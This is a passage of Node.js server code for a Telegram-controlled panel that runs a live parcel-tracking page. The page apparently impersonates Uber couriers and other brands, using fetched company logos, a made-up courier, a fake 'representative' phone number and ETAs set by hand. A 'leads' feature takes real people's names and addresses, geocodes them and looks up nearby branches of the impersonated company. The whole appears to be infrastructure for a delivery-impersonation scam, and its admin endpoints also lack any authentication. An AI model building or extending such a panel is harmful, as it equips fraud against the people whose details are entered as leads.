require('dotenv').config({ override: true });
const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { Server } = require('socket.io');
const { fetchBrand } = require('./brandfetch');

const PORT = process.env.PORT || 3000;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID ? String(process.env.ADMIN_CHAT_ID) : '';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';

// Authenticated chat sessions (chatId -> expiry timestamp). Logged-in admins.
const authedSessions = new Map();
const SESSION_TTL = 1000 * 60 * 60 * 4; // 4 hours

const COMPANIES_FILE = path.join(__dirname, 'companies.json');
const STATE_FILE = path.join(__dirname, 'state.json');
const LOGOS_DIR = path.join(__dirname, 'public', 'logos');

function loadCompanies() {
  try {
    return JSON.parse(fs.readFileSync(COMPANIES_FILE, 'utf8'));
  } catch (e) {
    console.error('Failed to load companies.json:', e.message);
    return [];
  }
}
function saveCompanies(list) {
  fs.writeFileSync(COMPANIES_FILE, JSON.stringify(list, null, 2));
}

// Predefined status flow shown as a timeline on the client page.
const STATUS_FLOW = [
  { status: 'Order received',  message: 'Your order has been received and is being prepared.' },
  { status: 'Courier assigned', message: 'Your courier has been assigned and is preparing to pick up your package.' },
  { status: 'Picking up',       message: 'Your courier is on the way to pick up the package.' },
  { status: 'En route',         message: 'Your package is on the way to you.' },
  { status: 'Arriving',         message: 'Your courier is almost there. Please be ready.' },
  { status: 'Arrived',          message: 'Your courier has arrived at the delivery location.' },
  { status: 'Delivered',        message: 'Your package has been delivered. Thank you for using our service!' },
];

function defaultState() {
  return {
    company: loadCompanies()[0] || null,
    client: {
      name: 'Valued Customer',
      trackingId: 'UB-' + Math.floor(1000 + Math.random() * 9000),
      address: '123 Market Street, Apt 4B',
      city: 'San Francisco',
      phone: '+1 415 555 0142',
    },
    courier: {
      name: 'Marco (Uber Courier)',
      vehicle: 'Bicycle',
      eta: '8 min',
      rating: '4.9',
      phone: '+1 415 555 0199',
    },
    order: {
      items: '1x Package (sealed)',
      note: 'Handle with care',
    },
    rep: {
      enabled: true,
      name: 'Dana Whitfield',
      number: '+1 415 555 0120',
      ext: '2207',
    },
    ui: {
      map: true,
      eta: true,
      timeline: true,
      courierCard: true,
      clientCard: true,
      orderCard: true,
      deliveryCode: true,
      instructions: true,
      uberLink: true,
      callCourier: true,
      rep: true,
    },
    leads: [],
    trip: {
      status: 'Courier assigned',
      statusMessage: 'Your courier has been assigned and is preparing to pick up your package.',
      uberLink: 'https://m.uber.com/',
      courierPos: { lat: 37.7749, lng: -122.4194 },
      destinationPos: { lat: 37.7849, lng: -122.4094 },
      route: null,
      stepIndex: 0,
      simulating: false,
      flowIndex: 1,
      deliveryCode: String(Math.floor(1000 + Math.random() * 9000)),
      etaMinutes: 8,
      etaDeadline: Date.now() + 8 * 60 * 1000,
      etaAuto: true,
      demoRunning: false,
      simSpeed: 2000,
      demoSpeed: 'normal',
    },
  };
}

function loadState() {
  try {
    const saved = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
    const base = defaultState();
    // shallow-merge each section so new fields still appear
    const merged = {
      company: saved.company || base.company,
      client: { ...base.client, ...(saved.client || {}) },
      courier: { ...base.courier, ...(saved.courier || {}) },
      order: { ...base.order, ...(saved.order || {}) },
      rep: { ...base.rep, ...(saved.rep || {}) },
      ui: { ...base.ui, ...(saved.ui || {}) },
      leads: saved.leads || [],
      trip: { ...base.trip, ...(saved.trip || {}) },
    };
    // ensure company still exists in companies.json (brand may have been renamed)
    if (merged.company && merged.company.id) {
      const live = loadCompanies().find((c) => c.id === merged.company.id);
      if (live) merged.company = live;
    }
    return merged;
  } catch (e) {
    return defaultState();
  }
}
function saveState() {
  try {
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
  } catch (e) {
    console.error('Failed to save state:', e.message);
  }
}

// ---------------- Geocoder (address -> lat/lng) ----------------
// Uses OpenStreetMap Nominatim — free, no API key required.
async function geocode(address) {
  const url = 'https://nominatim.openstreetmap.org/search?format=json&limit=1&q=' + encodeURIComponent(address);
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 10000);
  try {
    const res = await fetch(url, { headers: { 'User-Agent': 'courier-panel/1.0' }, signal: ctrl.signal });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (!data || data.length === 0) throw new Error('Address not found');
    return { lat: parseFloat(data[0].lat), lng: parseFloat(data[0].lon), display: data[0].display_name };
  } finally {
    clearTimeout(t);
  }
}

// ---------------- Lead parser ----------------
// Parses free-text lead entries: detects first/last name + location.
function parseLead(text) {
  const t = text.trim();
  if (!t) return null;
  // Try comma-separated: "John Smith, 123 Main St, San Francisco CA"
  const parts = t.split(',').map(s => s.trim()).filter(Boolean);
  let name = null, location = null;
  if (parts.length >= 2) {
    name = parts[0];
    location = parts.slice(1).join(', ');
  } else {
    // Try "Name from/at/in/near Location"
    const m = t.match(/^([A-Z][a-z]+(?:\s+[A-Z][a-z]+))\s+(?:from|at|in|near|@)\s+(.+)$/i);
    if (m) { name = m[1]; location = m[2]; }
    else {
      // Try two capitalized words + rest
      const m2 = t.match(/^([A-Z][a-z]+ [A-Z][a-z]+)\s+(.+)$/);
      if (m2) { name = m2[1]; location = m2[2]; }
      else { name = t; location = ''; }
    }
  }
  // Split name into first/last
  const nameParts = name.split(/\s+/);
  const firstName = nameParts[0] || '';
  const lastName = nameParts.length > 1 ? nameParts[nameParts.length - 1] : '';
  return { firstName, lastName, fullName: name, location, raw: t, branches: null, lat: null, lng: null };
}

// Find nearby branches of the current company near a location using Nominatim.
async function findNearbyBranches(companyName, location, limit) {
  const q = `${companyName} near ${location}`;
  const url = 'https://nominatim.openstreetmap.org/search?format=json&limit=' + (limit || 5) + '&q=' + encodeURIComponent(q);
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 10000);
  try {
    const res = await fetch(url, { headers: { 'User-Agent': 'courier-panel/1.0' }, signal: ctrl.signal });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    return data.map((d) => ({
      name: d.display_name,
      lat: parseFloat(d.lat),
      lng: parseFloat(d.lon),
      type: d.type,
    }));
  } finally {
    clearTimeout(t);
  }
}

// Process a bulk lead entry (multiple lines), geocoding + finding branches.
async function processLeads(text, companyName) {
  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
  const results = [];
  for (const line of lines) {
    const lead = parseLead(line);
    if (!lead) continue;
    if (lead.location) {
      try {
        const geo = await geocode(lead.location);
        lead.lat = geo.lat; lead.lng = geo.lng;
        lead.locationDisplay = geo.display;
      } catch (e) { lead.locationDisplay = lead.location; }
      try {
        lead.branches = await findNearbyBranches(companyName, lead.location, 5);
      } catch (e) { lead.branches = []; }
    }
    results.push(lead);
  }
  return results;
}

// ---------------- Global live state ----------------
const state = loadState();

// haversine distance in km
function distanceKm(a, b) {
  const R = 6371;
  const dLat = (b.lat - a.lat) * Math.PI / 180;
  const dLng = (b.lng - a.lng) * Math.PI / 180;
  const la1 = a.lat * Math.PI / 180;
  const la2 = b.lat * Math.PI / 180;
  const h = Math.sin(dLat / 2) ** 2 + Math.cos(la1) * Math.cos(la2) * Math.sin(dLng / 2) ** 2;
  return 2 * R * Math.asin(Math.min(1, Math.sqrt(h)));
}
// Rough ETA string from distance (assumes ~20km/h courier speed) unless manually set
// ETA — auto from distance, or manual override. Server tracks a countdown deadline.
function recalcEta() {
  if (!state.trip.etaAuto) return; // manual override in place
  if (state.trip.status === 'Arrived' || state.trip.status === 'Delivered') {
    state.trip.etaMinutes = 0;
    state.trip.etaDeadline = Date.now();
    return;
  }
  const d = distanceKm(state.trip.courierPos, state.trip.destinationPos);
  const minutes = Math.max(1, Math.round((d / 20) * 60));
  state.trip.etaMinutes = minutes;
  state.trip.etaDeadline = Date.now() + minutes * 60 * 1000;
}

function computeEta() {
  if (state.trip.status === 'Arrived' || state.trip.status === 'Delivered') return '0 min';
  if (state.trip.etaAuto) {
    const secs = Math.round((state.trip.etaDeadline - Date.now()) / 1000);
    if (secs <= 0) return '0 min';
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return m > 0 ? `${m}m ${s.toString().padStart(2, '0')}s` : `${s}s`;
  }
  return `${state.trip.etaMinutes || 0} min`;
}

function snapshot() {
  const eta = computeEta();
  return {
    company: state.company,
    client: state.client,
    courier: { ...state.courier, eta },
    order: state.order,
    rep: state.rep,
    leads: state.leads || [],
    ui: state.ui,
    trip: {
      status: state.trip.status,
      statusMessage: state.trip.statusMessage,
      uberLink: state.trip.uberLink,
      courierPos: state.trip.courierPos,
      destinationPos: state.trip.destinationPos,
      route: state.trip.route || null,
      stepIndex: state.trip.stepIndex,
      simulating: state.trip.simulating,
      simSpeed: state.trip.simSpeed,
      flowIndex: state.trip.flowIndex,
      deliveryCode: state.trip.deliveryCode,
      demoRunning: !!state.trip.demoRunning,
      etaDeadline: state.trip.etaDeadline,
      etaMinutes: state.trip.etaMinutes,
      etaAuto: state.trip.etaAuto,
      flow: STATUS_FLOW.map((f, i) => ({
        status: f.status,
        message: f.message,
        done: i < state.trip.flowIndex,
        active: i === state.trip.flowIndex,
      })),
    },
  };
}

let lastStatus = state.trip.status;
function broadcastUpdate() {
  const snap = snapshot();
  io.emit('state', snap);
  if (snap.trip.status !== lastStatus) {
    io.emit('statusChange', { from: lastStatus, to: snap.trip.status, message: snap.trip.statusMessage });
    lastStatus = snap.trip.status;
  }
  saveState();
}

// ---------------- Express + Socket.IO ----------------
const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/state', (req, res) => res.json(snapshot()));
app.get('/api/companies', (req, res) => res.json(loadCompanies()));

// Pull a brand live from its partner site and update companies.json + live state.
app.post('/api/fetch-brand', async (req, res) => {
  const id = String(req.query.id || req.body && req.body.id || '').toUpperCase();
  try {
    const fresh = await fetchBrand(id);
    const list = loadCompanies();
    const idx = list.findIndex((c) => c.id === id);
    if (idx >= 0) list[idx] = fresh; else list.push(fresh);
    saveCompanies(list);
    if (state.company && state.company.id === id) state.company = fresh;
    broadcastUpdate();
    res.json({ ok: true, brand: fresh });
  } catch (e) {
    res.status(400).json({ ok: false, error: e.message });
  }
});

// ---------------- Admin API (web dashboard) ----------------
app.post('/api/admin/update', (req, res) => {
  const b = req.body || {};
  const action = b.action;
  try {
    switch (action) {
      case 'setCompany': {
        const comp = loadCompanies().find((c) => c.id === b.id);
        if (comp) { state.company = comp; }
        break;
      }
      case 'setClient': {
        if (b.name) state.client.name = b.name;
        if (b.address) state.client.address = b.address;
        if (b.city) state.client.city = b.city;
        if (b.phone) state.client.phone = b.phone;
        break;
      }
      case 'setCourier': {
        if (b.name !== undefined) state.courier.name = b.name;
        if (b.vehicle !== undefined) state.courier.vehicle = b.vehicle;
        if (b.rating !== undefined) state.courier.rating = b.rating;
        if (b.phone !== undefined) state.courier.phone = b.phone;
        break;
      }
      case 'setRep': {
        if (b.name !== undefined) state.rep.name = b.name;
        if (b.number !== undefined) state.rep.number = b.number;
        if (b.ext !== undefined) state.rep.ext = b.ext;
        break;
      }
      case 'setOrder': {
        if (b.items !== undefined) state.order.items = b.items;
        if (b.note !== undefined) state.order.note = b.note;
        break;
      }
      case 'setStatus': {
        state.trip.statusMessage = b.message || '';
        break;
      }
      case 'setUber': {
        state.trip.uberLink = b.url || '';
        break;
      }
      case 'setETA': {
        const mins = parseInt(b.minutes, 10);
        if (!isNaN(mins) && mins >= 0) {
          state.trip.etaAuto = false;
          state.trip.etaMinutes = mins;
          state.trip.etaDeadline = Date.now() + mins * 60 * 1000;
        }
        break;
      }
      case 'etaAuto': {
        state.trip.etaAuto = true; recalcEta();
        break;
      }
      case 'advanceStatus': {
        advanceStatus(1);
        break;
      }
      case 'setStatusN': {
        const n = parseInt(b.n, 10);
        if (n >= 1 && n <= STATUS_FLOW.length) { state.trip.flowIndex = n - 1; applyFlowStatus(); }
        break;
      }
      case 'toggleUI': {
        const key = b.section;
        if (state.ui[key] !== undefined) state.ui[key] = !state.ui[key];
        break;
      }
      case 'setUI': {
        const key = b.section;
        if (state.ui[key] !== undefined) state.ui[key] = !!b.value;
        break;
      }
      case 'uiPreset': {
        const presets = {
          all: () => Object.keys(state.ui).forEach(k => state.ui[k] = true),
          minimal: () => { Object.keys(state.ui).forEach(k => state.ui[k] = false); state.ui.map = true; state.ui.eta = true; state.ui.courierCard = true; },
          investor: () => { Object.keys(state.ui).forEach(k => state.ui[k] = true); state.ui.instructions = false; },
        };
        if (presets[b.preset]) presets[b.preset]();
        break;
      }
      case 'simulate': {
        state.trip.simulating = !!b.on;
        if (state.trip.simulating && !state.trip.route) {
          state.trip.route = buildRouteN(state.trip.courierPos, state.trip.destinationPos, 12);
          state.trip.stepIndex = 0; recalcEta();
        }
        break;
      }
      case 'setSimSpeed': {
        state.trip.simSpeed = Math.max(500, Math.min(10000, parseInt(b.speed, 10) || 2000));
        break;
      }
      case 'step': {
        advanceCourier(); break;
      }
      case 'newOrder': {
        const keep = state.company;
        Object.assign(state, defaultState());
        state.company = keep;
        break;
      }
      case 'runDemo': {
        runDemo(null); break;
      }
      case 'stopDemo': {
        stopDemo(null); break;
      }
      case 'setDemoSpeed': {
        state.trip.demoSpeed = b.speed || 'normal';
        break;
      }
      case 'alert': {
        io.emit('alert', { text: b.text || '', ts: Date.now() });
        break;
      }
      case 'setBranding': {
        const fields = {};
        if (b.name) fields.name = b.name;
        if (b.theme) fields.theme = b.theme;
        if (b.primary) fields.primary = b.primary;
        if (b.accent) fields.accent = b.accent;
        applyCompanyField(fields);
        break;
      }
      case 'moveAddress': {
        geocode(b.address).then((r) => {
          state.trip.courierPos = { lat: r.lat, lng: r.lng };
          recalcEta(); broadcastUpdate();
          res.json({ ok: true, display: r.display });
        }).catch((e) => res.status(400).json({ ok: false, error: e.message }));
        return;
      }
      case 'routeAddress': {
        geocode(b.address).then(async (r) => {
          state.trip.destinationPos = { lat: r.lat, lng: r.lng };
          state.trip.route = await buildRoadRoute(state.trip.courierPos, state.trip.destinationPos);
          state.trip.stepIndex = 0;
          state.trip.simulating = true;
          state.trip.etaAuto = true;
          state.trip.flowIndex = 3; applyFlowStatus();
          broadcastUpdate();
          res.json({ ok: true, display: r.display });
        }).catch((e) => res.status(400).json({ ok: false, error: e.message }));
        return;
      }
      default:
        return res.status(400).json({ ok: false, error: 'Unknown action' });
    }
    broadcastUpdate();
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Serve the admin page
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// Lead management API
app.post('/api/leads/add', async (req, res) => {
  try {
    const text = (req.body && req.body.text) || '';
    const companyName = state.company ? state.company.name : '';
    const newLeads = await processLeads(text, companyName);
    state.leads = (state.leads || []).concat(newLeads);
    broadcastUpdate();
    res.json({ ok: true, added: newLeads.length, leads: newLeads });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});
app.post('/api/leads/clear', (req, res) => {
  state.leads = [];
  broadcastUpdate();
  res.json({ ok: true });
});
app.post('/api/leads/:id/activate', (req, res) => {
  const id = parseInt(req.params.id, 10);
  const lead = state.leads && state.leads[id];
  if (!lead) return res.status(404).json({ ok: false, error: 'Lead not found' });
  // Set this lead as the current client + set destination
  state.client.name = lead.fullName;
  if (lead.lat && lead.lng) {
    state.trip.destinationPos = { lat: lead.lat, lng: lead.lng };
    state.client.address = lead.location || '';
    state.client.city = lead.locationDisplay || lead.location || '';
  }
  broadcastUpdate();
  res.json({ ok: true });
});

io.on('connection', (socket) => {
  socket.emit('state', snapshot());
  console.log('client connected', socket.id);
});

// ---------------- Telegram Bot ----------------
let bot = null;
if (TOKEN && TOKEN.includes(':')) {
  bot = new TelegramBot(TOKEN, { polling: true });
  console.log('Telegram bot started in polling mode.');
} else {
  console.warn('No valid TELEGRAM_BOT_TOKEN. Bot disabled. Site still runs.');
}

// Auth: a chat is authorized if it has an active login session (and, if set, matches ADMIN_CHAT_ID).
function isAuthorized(msg) {
  const chatId = String(msg.chat.id);
  if (ADMIN_CHAT_ID && chatId !== ADMIN_CHAT_ID) return false;
  if (!ADMIN_PASSWORD) return true; // no password configured => open (not recommended)
  const exp = authedSessions.get(chatId);
  if (exp && exp > Date.now()) {
    authedSessions.set(chatId, Date.now() + SESSION_TTL); // rolling refresh
    return true;
  }
  return false;
}

// Extract a chat id from either a message or a callback_query.
function chatIdOf(ctx) {
  if (ctx.chat) return String(ctx.chat.id);
  if (ctx.message && ctx.message.chat) return String(ctx.message.chat.id);
  return null;
}

function notifyUnauthorized(msg) {
  const chatId = String(msg.chat.id);
  const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'there';
  bot.sendMessage(chatId, `🔒 Hi ${name}.\nThis bot is locked. Enter the password to access the admin panel.`);
}

// ---------------- Menu ----------------
function sendMenu(chatId, text) {
  const kb = {
    inline_keyboard: [
      [
        { text: 'Switch company', callback_data: 'company_menu' },
        { text: 'Edit branding', callback_data: 'brand_menu' },
      ],
      [
        { text: '✏️ Client info', callback_data: 'edit:client' },
        { text: '✏️ Courier info', callback_data: 'edit:courier' },
      ],
      [
        { text: '✏️ Representative', callback_data: 'edit:rep' },
        { text: '✏️ Order details', callback_data: 'edit:order' },
      ],
      [
        { text: '⏱ ETA', callback_data: 'edit:eta' },
        { text: '✏️ Status text', callback_data: 'edit:status' },
      ],
      [
        { text: 'Advance status ▶', callback_data: 'next_status' },
        { text: '✏️ Uber link', callback_data: 'edit:uber' },
      ],
      [
        { text: '👁 Section toggles', callback_data: 'toggle_menu' },
        { text: '📍 Move courier', callback_data: 'edit:move' },
      ],
      [
        { text: '📍 Set route', callback_data: 'edit:route' },
        { text: '▶️ Simulate trip', callback_data: 'simulate_toggle' },
      ],
      [
        { text: '🆕 New order', callback_data: 'new_order' },
        { text: '🎬 Run demo', callback_data: 'run_demo' },
      ],
      [
        { text: '⏹ Stop demo', callback_data: 'stop_demo' },
        { text: '🔄 Refresh brand', callback_data: 'refresh_menu' },
      ],
      [
        { text: '📢 Push alert', callback_data: 'edit:alert' },
        { text: '📋 Leads', callback_data: 'edit:leads' },
      ],
      [
        { text: '🗑 Clear leads', callback_data: 'clear_leads' },
        { text: '📋 Show panel', callback_data: 'show_state' },
      ],
      [
        { text: '🚪 Logout', callback_data: 'logout' },
      ],
    ],
  };
  bot.sendMessage(chatId, text || '🎛 *Courier Panel admin*\nTap a button below — no commands needed.', { reply_markup: kb, parse_mode: 'Markdown' });
}

// ---------------- Conversation wizard ----------------
// Each wizard is a sequence of fields. The user types a value, sees a Confirm button, then moves on.
const WIZARDS = {
  client: {
    title: '✏️ Client Information',
    fields: [
      { key: 'name',    label: 'client name',           apply: (v) => state.client.name = v },
      { key: 'address', label: 'delivery address',      apply: (v) => state.client.address = v },
      { key: 'city',    label: 'city',                  apply: (v) => state.client.city = v },
      { key: 'phone',   label: 'client phone number',  apply: (v) => state.client.phone = v },
    ],
  },
  courier: {
    title: '✏️ Courier Information',
    fields: [
      { key: 'name',    label: 'courier name',          apply: (v) => state.courier.name = v },
      { key: 'vehicle', label: 'vehicle type',          apply: (v) => state.courier.vehicle = v },
      { key: 'rating',  label: 'courier rating',        apply: (v) => state.courier.rating = v },
      { key: 'phone',   label: 'courier phone number',  apply: (v) => state.courier.phone = v },
    ],
  },
  rep: {
    title: '✏️ Representative',
    fields: [
      { key: 'name',   label: 'representative name',   apply: (v) => state.rep.name = v },
      { key: 'number', label: 'representative phone', apply: (v) => state.rep.number = v },
      { key: 'ext',    label: 'extension (or "none")', apply: (v) => state.rep.ext = (v === 'none' ? '' : v) },
    ],
  },
  order: {
    title: '✏️ Order Details',
    fields: [
      { key: 'items', label: 'package contents',  apply: (v) => state.order.items = v },
      { key: 'note',  label: 'delivery note',      apply: (v) => state.order.note = v },
    ],
  },
  eta: {
    title: '⏱ Estimated Time of Arrival',
    fields: [
      { key: 'minutes', label: 'ETA in minutes (number)', apply: (v) => {
        const n = parseInt(v, 10);
        if (isNaN(n) || n < 0) return false;
        state.trip.etaAuto = false;
        state.trip.etaMinutes = n;
        state.trip.etaDeadline = Date.now() + n * 60 * 1000;
        return true;
      }, numeric: true },
    ],
  },
  status: {
    title: '✏️ Status Message',
    fields: [
      { key: 'message', label: 'status message to show the client', apply: (v) => state.trip.statusMessage = v },
    ],
  },
  uber: {
    title: '✏️ Uber Deep Link',
    fields: [
      { key: 'url', label: 'Uber URL (full link)', apply: (v) => state.trip.uberLink = v },
    ],
  },
  move: {
    title: '📍 Move Courier',
    fields: [
      { key: 'address', label: 'address or place name (e.g. "350 Fifth Avenue, New York")', apply: async (v, chatId) => {
        const r = await geocode(v);
        state.trip.courierPos = { lat: r.lat, lng: r.lng };
        recalcEta();
        if (chatId) bot.sendMessage(chatId, `📍 Found: ${r.display}`);
        return true;
      } },
    ],
  },
  route: {
    title: '📍 Set Destination & Start Route',
    fields: [
      { key: 'address', label: 'delivery address (e.g. "1 Market Street, San Francisco")', apply: async (v, chatId) => {
        const r = await geocode(v);
        state.trip.destinationPos = { lat: r.lat, lng: r.lng };
        state.trip.route = await buildRoadRoute(state.trip.courierPos, state.trip.destinationPos);
        state.trip.stepIndex = 0;
        state.trip.simulating = true;
        state.trip.etaAuto = true;
        state.trip.flowIndex = 3; applyFlowStatus();
        if (chatId) bot.sendMessage(chatId, `📍 Found: ${r.display}`);
        return true;
      } },
    ],
  },
  alert: {
    title: '📢 Push Alert',
    fields: [
      { key: 'text', label: 'alert message to push to the client page', apply: (v) => {
        io.emit('alert', { text: v, ts: Date.now() }); return true;
      } },
    ],
  },
  leads: {
    title: '📋 Add Leads',
    fields: [
      { key: 'leads', label: 'lead(s) — one per line:\nJohn Smith, 123 Market St, San Francisco\nJane Doe, 456 Oak Ave, New York', apply: async (v, chatId) => {
        const companyName = state.company ? state.company.name : '';
        const newLeads = await processLeads(v, companyName);
        state.leads = (state.leads || []).concat(newLeads);
        broadcastUpdate();
        if (chatId) {
          let msg = `✅ Added ${newLeads.length} lead(s):\n`;
          newLeads.forEach((l, i) => {
            msg += `\n${i+1}. ${l.fullName}`;
            if (l.location) msg += ` — ${l.locationDisplay || l.location}`;
            if (l.branches && l.branches.length) msg += `\n   📍 ${l.branches.length} nearby ${companyName} branches found`;
          });
          bot.sendMessage(chatId, msg);
        }
        return true;
      } },
    ],
  },
  name: {
    title: '✏️ Company Name',
    fields: [
      { key: 'name', label: 'new company name', apply: (v) => {
        applyCompanyField({ name: v }); return true;
      } },
    ],
  },
  color: {
    title: '🎨 Brand Colors',
    fields: [
      { key: 'primary', label: 'primary color (hex, e.g. #1FBAD6)', apply: (v) => { convo.primary = v; }, hold: true },
      { key: 'accent',  label: 'accent color (hex or "same")',       apply: (v) => {
        const p = convo.primary;
        const a = (v === 'same') ? p : v;
        applyCompanyField({ primary: p, accent: a }); return true;
      } },
    ],
  },
};

// Per-chat conversation state
const convos = {}; // chatId -> { wizard, fieldIdx, holdData: {}, pendingValue }
const convo = { lat: null, primary: null }; // scratch for multi-field holds

function startWizard(chatId, wizardKey) {
  const w = WIZARDS[wizardKey];
  if (!w) return;
  convos[chatId] = { wizard: wizardKey, fieldIdx: 0, holdData: {} };
  askField(chatId);
}

function askField(chatId) {
  const c = convos[chatId];
  if (!c) return;
  const w = WIZARDS[c.wizard];
  const field = w.fields[c.fieldIdx];
  const progress = `[Step ${c.fieldIdx + 1}/${w.fields.length}]`;
  bot.sendMessage(chatId, `${w.title}\n${progress}\n\nPlease enter the *${field.label}*:\n\n(Type it below and press ➤ Send)`, { parse_mode: 'Markdown' });
}

function showConfirm(chatId, value) {
  const kb = {
    inline_keyboard: [
      [
        { text: '✅ Confirm', callback_data: 'confirm_value' },
        { text: '✏️ Re-enter', callback_data: 'reenter' },
      ],
      [
        { text: '❌ Cancel', callback_data: 'cancel_convo' },
      ],
    ],
  };
  bot.sendMessage(chatId, `You entered:\n\n*${value}*\n\nDoes this look right?`, { reply_markup: kb, parse_mode: 'Markdown' });
}

function applyConfirmed(chatId) {
  const c = convos[chatId];
  if (!c) return;
  const w = WIZARDS[c.wizard];
  const field = w.fields[c.fieldIdx];
  const value = c.pendingValue;
  bot.sendMessage(chatId, '⏳ Processing...').then((m) => {
    const done = (ok) => {
      try { bot.deleteMessage(chatId, m.message_id).catch(() => {}); } catch (e) {}
      if (ok === false) {
        bot.sendMessage(chatId, `⚠️ Invalid value for *${field.label}*. Please try again.`, { parse_mode: 'Markdown' });
        askField(chatId);
        return;
      }
      c.fieldIdx++;
      if (c.fieldIdx >= w.fields.length) {
        delete convos[chatId];
        broadcastUpdate();
        bot.sendMessage(chatId, `✅ ${w.title.replace(/^[^\s]+\s/, '')} updated successfully!`, { parse_mode: 'Markdown' });
        sendMenu(chatId, 'Anything else?');
      } else {
        broadcastUpdate();
        askField(chatId);
      }
    };
    const result = field.apply(value, chatId);
    if (result && typeof result.then === 'function') result.then(done).catch(() => done(false));
    else done(result);
  });
}

// ---------------- Bot handlers ----------------
if (bot) {
  // Any text message (no slash commands)
  bot.on('message', (msg) => {
    if (!msg.text) return; // photos handled separately
    const chatId = String(msg.chat.id);
    if (ADMIN_CHAT_ID && chatId !== ADMIN_CHAT_ID) {
      return bot.sendMessage(chatId, '⛔ This chat is not authorized.');
    }
    // Not logged in yet — treat text as password attempt
    if (!isAuthorized(msg)) {
      if (!ADMIN_PASSWORD) {
        authedSessions.set(chatId, Date.now() + SESSION_TTL);
        return sendMenu(chatId, `Welcome, *${msg.from.first_name}*.`);
      }
      if (msg.text.trim() === ADMIN_PASSWORD) {
        authedSessions.set(chatId, Date.now() + SESSION_TTL);
        return sendMenu(chatId, `✅ Access granted. Welcome, *${msg.from.first_name}*!\nTap a button below to control the panel.`);
      }
      return bot.sendMessage(chatId, '❌ Wrong password. Try again:');
    }
    // Logged in + active conversation → treat as field input
    if (convos[chatId]) {
      convos[chatId].pendingValue = msg.text.trim();
      return showConfirm(chatId, msg.text.trim());
    }
    // Logged in, no conversation → show menu
    sendMenu(chatId, `Hi *${msg.from.first_name}*! Tap a button below:`);
  });

  // Logo upload via photo
  bot.on('photo', (msg) => {
    const chatId = String(msg.chat.id);
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, '🔒 Enter the password first.');
    const photos = msg.photo;
    const largest = photos[photos.length - 1];
    bot.downloadFile(largest.file_id, LOGOS_DIR).then((filePath) => {
      const ext = path.extname(filePath) || '.jpg';
      const newName = `uploaded_${state.company.id}${ext}`;
      const finalPath = path.join(LOGOS_DIR, newName);
      fs.renameSync(filePath, finalPath);
      const list = loadCompanies();
      const idx = list.findIndex((c) => c.id === state.company.id);
      if (idx >= 0) {
        list[idx].logo = `/logos/${newName}`;
        if (msg.caption && msg.caption.trim()) list[idx].name = msg.caption.trim();
        saveCompanies(list);
        state.company = list[idx];
        broadcastUpdate();
      }
      bot.sendMessage(chatId, `✅ Logo updated${msg.caption ? ` and name set to *${msg.caption.trim()}*` : ''}.`, { parse_mode: 'Markdown' });
    }).catch((e) => bot.sendMessage(chatId, 'Failed to save logo: ' + e.message));
  });

  // Inline button callbacks
  bot.on('callback_query', (q) => {
    const chatId = String(q.message.chat.id);
    const data = q.data;
    bot.answerCallbackQuery(q.id).catch(() => {});

    // Anyone can attempt; gate by auth
    const authMsg = { chat: q.message.chat, from: q.from };
    if (!isAuthorized(authMsg)) {
      return bot.sendMessage(chatId, '🔒 Enter the password to access the panel.');
    }

    switch (data) {
      // ---- navigation / actions ----
      case 'logout':
        authedSessions.delete(chatId);
        bot.sendMessage(chatId, '🔒 Logged out. Send the password to log back in.');
        return;

      case 'company_menu': {
        const kb = { inline_keyboard: loadCompanies().map((c) => [
          { text: `${c.id} - ${c.name}${state.company && state.company.id === c.id ? '  ✓' : ''}`, callback_data: `switch:${c.id}` },
        ]) };
        bot.sendMessage(chatId, 'Select a company brand:', { reply_markup: kb });
        return;
      }
      case 'brand_menu': {
        const kb = { inline_keyboard: [
          [{ text: '✏️ Company name', callback_data: 'edit:name' }],
          [{ text: '🎨 Brand colors', callback_data: 'edit:color' }],
          [{ text: '🌓 Toggle theme', callback_data: 'toggle_theme' }],
        ] };
        bot.sendMessage(chatId, 'Edit branding:', { reply_markup: kb });
        return;
      }
      case 'toggle_theme': {
        const theme = state.company.theme === 'dark' ? 'light' : 'dark';
        applyCompanyField({ theme });
        broadcastUpdate();
        bot.sendMessage(chatId, `Theme set to *${theme}*.`, { parse_mode: 'Markdown' });
        return;
      }
      case 'next_status':
        advanceStatus(1); broadcastUpdate();
        bot.sendMessage(chatId, `Status: *${state.trip.status}*`, { parse_mode: 'Markdown' });
        return;
      case 'new_order': {
        const keep = state.company;
        Object.assign(state, defaultState());
        state.company = keep;
        broadcastUpdate();
        bot.sendMessage(chatId, `🆕 New order started.\nTracking: ${state.client.trackingId}\nCode: \`${state.trip.deliveryCode}\``, { parse_mode: 'Markdown' });
        return;
      }
      case 'run_demo':
        runDemo(chatId); return;
      case 'stop_demo':
        stopDemo(chatId); return;
      case 'simulate_toggle':
        state.trip.simulating = !state.trip.simulating;
        if (state.trip.simulating && !state.trip.route) {
          buildRoadRoute(state.trip.courierPos, state.trip.destinationPos).then((rt) => {
            state.trip.route = rt; state.trip.stepIndex = 0; recalcEta(); broadcastUpdate();
          });
        }
        broadcastUpdate();
        bot.sendMessage(chatId, `Simulation ${state.trip.simulating ? '▶️ ON' : '⏸ OFF'}.`);
        return;
      case 'clear_leads':
        state.leads = []; broadcastUpdate();
        bot.sendMessage(chatId, '🗑 Leads cleared.');
        return;
